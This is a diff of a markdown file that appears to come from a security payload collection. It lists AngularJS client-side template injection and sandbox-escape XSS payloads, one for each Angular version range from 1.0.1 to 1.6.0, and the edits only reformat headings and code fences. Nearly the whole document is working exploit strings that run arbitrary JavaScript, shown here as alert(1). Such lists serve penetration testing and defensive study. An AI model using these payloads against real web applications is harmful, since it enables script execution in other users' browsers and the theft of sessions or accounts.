@@ -1,11 +1,14 @@
-## XSS in Angular
+# XSS in Angular
+
 Angular 1.6.0
-```
+
+```javascript
 {{0[a='constructor'][a]('alert(1)')()}}
 ```
 
 Angular 1.5.9
-```
+
+```javascript
 {{
     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
     c.$apply=$apply;c.$eval=b;op=$root.$$phase;
@@ -23,22 +26,26 @@ Angular 1.5.9
 ```
 
 Angular 1.5.0 - 1.5.8
-```
+
+```javascript
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
 ```
 
 Angular 1.4.0 - 1.4.9
-```
+
+```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
 ```
 
 Angular 1.3.20
-```
+
+```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
 ```
 
 Angular 1.3.19
-```
+
+```javascript
 {{
     'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
     $eval('x=alert(1)//');
@@ -46,14 +53,16 @@ Angular 1.3.19
 ```
 
 Angular 1.3.3 - 1.3.18
-```
+
+```javascript
 {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
   'a'.constructor.prototype.charAt=[].join;
   $eval('x=alert(1)//');  }}
 ```
 
 Angular 1.3.1 - 1.3.2
-```
+
+```javascript
 {{
     {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
     'a'.constructor.prototype.charAt=''.valueOf;
@@ -62,7 +71,8 @@ Angular 1.3.1 - 1.3.2
 ```
 
 Angular 1.3.0
-```
+
+```javascript
 {{!ready && (ready = true) && (
       !call
       ? $$watchers[0].get(toString.constructor.prototype)
@@ -80,31 +90,37 @@ Angular 1.3.0
 ```
 
 Angular 1.2.24 - 1.2.29
-```
+
+```javascript
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 ```
 
 Angular 1.2.19 - 1.2.23
-```
+
+```javascript
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
 ```
 
 Angular 1.2.6 - 1.2.18
-```
+
+```javascript
 {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
 ```
 
 Angular 1.2.2 - 1.2.5
-```
+
+```javascript
 {{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
 ```
 
 Angular 1.2.0 - 1.2.1
-```
+
+```javascript
 {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
 ```
 
 Angular 1.0.1 - 1.1.5
-```
+
+```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
